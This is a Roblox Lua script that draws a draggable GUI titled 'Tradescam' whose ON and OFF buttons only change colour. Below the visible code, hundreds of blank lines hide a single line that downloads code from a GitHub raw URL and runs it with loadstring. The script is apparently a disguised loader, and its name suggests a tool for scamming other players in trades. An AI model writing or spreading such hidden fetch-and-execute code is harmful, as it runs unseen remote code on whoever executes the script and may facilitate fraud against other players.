-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "Tradescam"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create a Frame to contain the buttons
local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- Function to create a button
local function createButton(name, position, isActive)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 80, 0, 40)
    button.Position = position
    button.BackgroundColor3 = isActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    button.Text = name
    button.Parent = frame
    return button
end

-- Create on and off buttons
local onButton = createButton("ON", UDim2.new(0.1, 0, 0.5, -20), false)
local offButton = createButton("OFF", UDim2.new(0.6, 0, 0.5, -20), true)

-- Function to handle button clicks
local function buttonClicked(button)
    if button.Text == "ON" then
        onButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        offButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    elseif button.Text == "OFF" then
        onButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        offButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    end
end

-- Connect button click events
onButton.MouseButton1Click:Connect(function()
    buttonClicked(onButton)
end)

offButton.MouseButton1Click:Connect(function()
    buttonClicked(offButton)
end)

-- Function to make the frame draggable
local dragging
local dragInput
local dragStart
local startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































loadstring(game:HttpGet("https://raw.githubusercontent.com/MaximusN314/Tradescam-Gui-Lib/main/Tradescam%20Gui%20Lib"))()
















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































